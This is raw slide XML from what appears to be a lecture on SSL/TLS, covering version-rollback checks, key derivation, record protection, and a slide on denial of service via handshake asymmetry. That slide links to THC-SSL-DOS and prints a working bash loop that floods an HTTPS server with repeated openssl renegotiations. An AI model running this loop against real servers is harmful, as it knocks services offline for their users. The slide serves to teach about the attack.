                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>“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Embed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="9933FF"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-52">
                <a:solidFill>
                  <a:srgbClr val="9933FF"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="9933FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>version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number</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-26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into</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-26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9933FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>secret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911379" name="object 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3914640" y="3809880"/>
            <a:ext cx="3680280" cy="599760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 3680280"/>
              <a:gd name="textAreaRight" fmla="*/ 3680640 w 3680280"/>
              <a:gd name="textAreaTop" fmla="*/ 0 h 599760"/>
              <a:gd name="textAreaBottom" fmla="*/ 600120 h 599760"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="3680459" h="600075" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1939130" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2770187" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3324224" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3324224" y="100012"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3679883" y="171434"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3324224" y="250030"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3324224" y="600074"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2770187" y="600074"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1939130" y="600074"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="600074"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="250030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noFill/>
          <a:ln w="28574">
            <a:solidFill>
              <a:srgbClr val="AB56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8948981" name="object 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3993480" y="3843000"/>
            <a:ext cx="3047040" cy="746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3040" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12600">
              <a:lnSpc>
                <a:spcPts val="1899"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="181"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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Check</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-3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that</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-32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received</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-32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version</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-32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9933FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>is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equal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-1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to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-1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the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-1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version</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-1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9933FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>in</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="9933FF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9933FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>ClientHello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59241" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="3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8B552A38-7126-4041-8E2F-45ACD03934A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13890" name="object 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1931400" y="5504039"/>
            <a:ext cx="22107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17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switch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derived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from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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18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N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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8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460755" name="object 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5006160" y="5504039"/>
            <a:ext cx="221076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17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switch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derived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from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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secret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-1" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="4180FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>c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,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N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-38" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="4180FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>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03620" name="object 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5400720" y="1143000"/>
            <a:ext cx="3514320" cy="369720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 3514320"/>
              <a:gd name="textAreaRight" fmla="*/ 3514680 w 351432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514725" h="370205" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="3514723" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3514723" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="351472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88856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Exploiting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for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Denial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Service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932609" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="3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D01B04AC-39E2-42C3-9A1C-D18ABF6B82BF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065269" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1176120"/>
            <a:ext cx="8269200" cy="3638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495612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https://www.thc.org/thc-ssl-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="sng" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:hlinkClick r:id="rId3" tooltip=""/>
              </a:rPr>
              <a:t>dos/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956120">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="289"/>
              </a:spcBef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defRPr/>
            </a:pP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2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simple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commands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in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bash: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9"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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-----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BASH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-7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SCRIPT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-7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BEGIN-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---</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-52">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>-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thc-ssl-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dosit()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-3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{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while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:;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(while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:;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-3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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-26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echo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R;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-3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done)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|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openssl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-3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s_client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"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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connect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-7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127.0.0.1:443</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-66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2&gt;/dev/null;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-72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done</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-60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52">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>}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9"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-26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x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in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`seq</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1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1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100`;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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1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thc-ssl-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dosit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-26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&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1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done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99"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>-----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BASH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="FF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SCRIPT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> END-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>-----</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-52">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>-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"/>
              </a:spcBef>
              <a:defRPr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defRPr/>
            </a:pP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THC-SSL-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DOS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is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</a:t>
            </a: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tool</a:t>
            </a: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</a:t>
            </a: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verify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</a:t>
            </a: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performance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0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of</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-32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SSL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218589" name="object 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="406439" y="4648320"/>
            <a:ext cx="8203680" cy="721080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38099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11600" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="141480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="879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Establishing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-4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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-4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secure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-4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SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-4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connection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-4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requires</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-4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15x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-4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more</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-4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Arial"/>
              </a:rPr>
              <a:t>processing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power</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-35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server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-32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than</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-32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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0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Arial"/>
              </a:rPr>
              <a:t>client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772859" name="object 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="5662080"/>
            <a:ext cx="778932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000" b="0" strike="noStrike" spc="-2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2000" b="1" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>THC-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" strike="noStrike" spc="-41">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>SSL-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DOS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" strike="noStrike" spc="4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05">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>exploits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14">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>this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97">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>asymmetric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10">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>property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14">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>by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05">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>overloading</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" strike="noStrike" spc="4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26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2000" b="1" strike="noStrike" spc="-80">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" strike="noStrike" spc="-60">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> and</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" strike="noStrike" spc="-35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20">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>knocking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" strike="noStrike" spc="-2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97">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>it</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" strike="noStrike" spc="-35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14">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>off</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" strike="noStrike" spc="-26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66">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" strike="noStrike" spc="-32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1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Internet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>”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29994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SSL/TLS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Record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Protection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79733324" name="object 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1069920" y="1882440"/>
            <a:ext cx="7092720" cy="4130280"/>
            <a:chOff x="1069920" y="1882440"/>
            <a:chExt cx="7092720" cy="4130280"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="307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69920" y="1882440"/>
              <a:ext cx="7092720" cy="4130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08" name="object 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4419720" y="4038480"/>
              <a:ext cx="456840" cy="12949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1294920"/>
                <a:gd name="textAreaBottom" fmla="*/ 1295280 h 1294920"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="457200" h="1295400" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="60770" y="3856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="115378" y="14738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="161644" y="31617"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="197389" y="53465"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="228599" y="107949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="228599" y="539750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="236765" y="568447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="295555" y="616082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="341821" y="632961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="396429" y="643843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="457199" y="647699"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="396429" y="651555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="341821" y="662437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="295555" y="679317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259810" y="701164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="228599" y="755648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="228599" y="1187450"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="220434" y="1216147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="197389" y="1241934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="161644" y="1263782"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="115378" y="1280661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60770" y="1291543"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1295399"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="28574">
              <a:solidFill>
                <a:srgbClr val="FF4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73910432" name="object 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4934880" y="4370040"/>
            <a:ext cx="3578040" cy="931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4839" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12600">
              <a:lnSpc>
                <a:spcPts val="2381"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="196"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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Use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-35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symmetric</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-32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keys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-32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FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>established </a:t>
            </a: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in</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-26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the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-26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FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>handshake</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="FF00FF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FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>protocol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03857" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="3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E61C968-D220-47C1-BCE6-957AE452E3A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8721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Most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Common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Use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SSL/TLS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13486358" name="object 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="762120" y="1627200"/>
            <a:ext cx="7416360" cy="4925520"/>
            <a:chOff x="762120" y="1627200"/>
            <a:chExt cx="7416360" cy="4925520"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="313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762120" y="1627200"/>
              <a:ext cx="7416360" cy="4762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4" name="object 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6781680" y="6095880"/>
              <a:ext cx="456840" cy="45684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457200" h="457200" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="228599" y="122766"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="307381" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="299614" y="112712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="389042" y="94339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="353525" y="154834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="446553" y="172233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="372681" y="221720"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="457199" y="281304"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="356382" y="273938"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="384068" y="383010"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="296756" y="306006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280394" y="417766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="222927" y="316124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="179599" y="457199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="163300" y="330771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="100795" y="372893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119951" y="294999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2857" y="308758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78782" y="249237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="182350"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97938" y="161226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7831" y="48577"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="154770" y="133773"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="176783" y="48577"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="228599" y="122766"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="28574">
              <a:solidFill>
                <a:srgbClr val="FF4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object 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1143000" y="1981080"/>
              <a:ext cx="685440" cy="456840"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 685440"/>
                <a:gd name="textAreaRight" fmla="*/ 685800 w 6854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685800" h="457200" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="342899" y="122766"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="461073" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="449421" y="112712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="583564" y="94339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="530288" y="154833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="669829" y="172233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="559021" y="221720"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="685799" y="281304"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="534574" y="273939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="576103" y="383010"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="445134" y="306006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="420592" y="417766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="334390" y="316124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="269398" y="457199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="244951" y="330771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="151193" y="372893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="179927" y="294999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4286" y="308758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="118173" y="249237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="182350"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="146907" y="161226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11747" y="48577"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232155" y="133773"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="265175" y="48577"/>
                  </a:lnTo>
                  <a:lnTo>
